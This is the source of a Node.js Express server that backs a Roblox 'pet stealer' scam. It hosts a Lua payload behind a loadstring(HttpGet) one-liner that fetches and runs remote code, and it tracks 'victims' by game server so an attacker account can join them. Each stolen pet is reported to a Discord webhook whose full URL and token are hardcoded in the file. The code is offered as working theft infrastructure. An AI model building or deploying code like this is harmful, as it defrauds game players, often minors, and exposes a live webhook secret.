
const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Discord webhook URL
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || 'https://discord.com/api/webhooks/1325765386238562327/eq2myv5HzzanELHVxPS7My4DLDuMJmpWgGet5zatQ8T0FgTOdj8yOsiATV_92NkzaDTy';

// Middleware for JSON parsing
app.use(express.json());

// Enable CORS for all routes
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

// Serve the Lua script
app.get('/script', (req, res) => {
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  
  try {
    const scriptPath = path.join(__dirname, 'pet-stealer.lua');
    const scriptContent = fs.readFileSync(scriptPath, 'utf8');
    res.send(scriptContent);
    console.log('Served pet-stealer.lua script');
  } catch (error) {
    console.error('Error reading Lua script:', error);
    res.status(500).send('-- Error loading script');
  }
});

// Alternative endpoint for raw script
app.get('/raw', (req, res) => {
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  
  try {
    const scriptPath = path.join(__dirname, 'pet-stealer.lua');
    const scriptContent = fs.readFileSync(scriptPath, 'utf8');
    res.send(scriptContent);
    console.log('Served pet-stealer.lua script via /raw');
  } catch (error) {
    console.error('Error reading Lua script:', error);
    res.status(500).send('-- Error loading script');
  }
});

// Serve the Allabove26 auto-join script
app.get('/allabove26-autojoin.lua', (req, res) => {
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  
  try {
    const scriptPath = path.join(__dirname, 'allabove26-autojoin.lua');
    const scriptContent = fs.readFileSync(scriptPath, 'utf8');
    res.send(scriptContent);
    console.log('Served allabove26-autojoin.lua script');
  } catch (error) {
    console.error('Error reading auto-join script:', error);
    res.status(500).send('-- Error loading auto-join script');
  }
});

// Store waiting victims
let waitingVictims = [];

// Endpoint for victims to report their server
app.post('/victim-server', (req, res) => {
  try {
    const serverData = req.body;
    console.log('Victim server reported:', serverData.victimUsername);
    
    // Add to waiting victims list
    waitingVictims.push({
      ...serverData,
      reportedAt: Date.now()
    });
    
    // Remove old entries (older than 10 minutes)
    const tenMinutesAgo = Date.now() - (10 * 60 * 1000);
    waitingVictims = waitingVictims.filter(victim => victim.reportedAt > tenMinutesAgo);
    
    res.status(200).json({ success: true, message: 'Server location recorded' });
  } catch (error) {
    console.error('Error recording victim server:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Endpoint for Allabove26 to get waiting victims
app.get('/get-victim-servers', (req, res) => {
  try {
    // Remove old entries
    const tenMinutesAgo = Date.now() - (10 * 60 * 1000);
    waitingVictims = waitingVictims.filter(victim => victim.reportedAt > tenMinutesAgo);
    
    res.status(200).json({ victims: waitingVictims });
  } catch (error) {
    console.error('Error getting victim servers:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Pet theft logging endpoint
app.post('/log-pet-theft', async (req, res) => {
  try {
    const petData = req.body;
    console.log('Pet theft logged:', petData);

    // Create rich Discord embed for pet theft
    const embed = {
      embeds: [{
        title: "🐾 **PET STOLEN SUCCESSFULLY**",
        color: 0xFF0000,
        thumbnail: {
          url: "https://cdn.discordapp.com/emojis/1234567890123456789.png" // Pet emoji
        },
        fields: [
          {
            name: "🎯 **Pet Name**",
            value: petData.petName || "Unknown Pet",
            inline: true
          },
          {
            name: "💎 **Rarity**", 
            value: petData.petRarity || "Common",
            inline: true
          },
          {
            name: "💰 **Value**",
            value: petData.petValue?.toString() || "0",
            inline: true
          },
          {
            name: "👤 **Stolen From**",
            value: petData.fromPlayer || "Unknown Player",
            inline: true
          },
          {
            name: "🎁 **Sent To**",
            value: petData.toPlayer || "Unknown Target",
            inline: true
          },
          {
            name: "🎮 **Game**",
            value: petData.game || "Unknown Game",
            inline: true
          },
          {
            name: "🆔 **Place ID**",
            value: petData.placeId?.toString() || "Unknown",
            inline: true
          },
          {
            name: "⏰ **Timestamp**",
            value: petData.timestamp || new Date().toISOString(),
            inline: true
          },
          {
            name: "✅ **Status**",
            value: "Pet Successfully Transferred",
            inline: false
          }
        ],
        footer: {
          text: "🔥 Pet Stealer Script v1.0 | Made by SL4A"
        },
        timestamp: new Date().toISOString()
      }]
    };

    // Send to Discord webhook
    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(embed)
    });

    if (response.ok) {
      console.log('Pet theft successfully logged to Discord');
      res.status(200).json({ success: true });
    } else {
      console.error('Failed to send to Discord:', response.status);
      res.status(500).json({ error: 'Failed to send to Discord' });
    }

  } catch (error) {
    console.error('Error logging pet theft:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    service: 'Lua Script Server',
    timestamp: new Date().toISOString() 
  });
});

// Root endpoint with service info
app.get('/', (req, res) => {
  res.json({ 
    service: 'Lua Script Hosting Service',
    status: 'Running',
    endpoints: {
      '/script': 'GET - Serve pet-stealer.lua script',
      '/raw': 'GET - Alternative endpoint for lua script',
      '/log-pet-theft': 'POST - Log pet theft with Discord webhook',
      '/health': 'GET - Health check'
    },
    usage: 'loadstring(game:HttpGet("' + req.protocol + '://' + req.get('host') + '/script"))()',
    timestamp: new Date().toISOString() 
  });
});

// Start the server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Lua Script Server running on port ${PORT}`);
  console.log(`Script available at: http://0.0.0.0:${PORT}/script`);
  console.log(`Usage: loadstring(game:HttpGet("https://your-zeabur-domain.app/script"))()`);
});
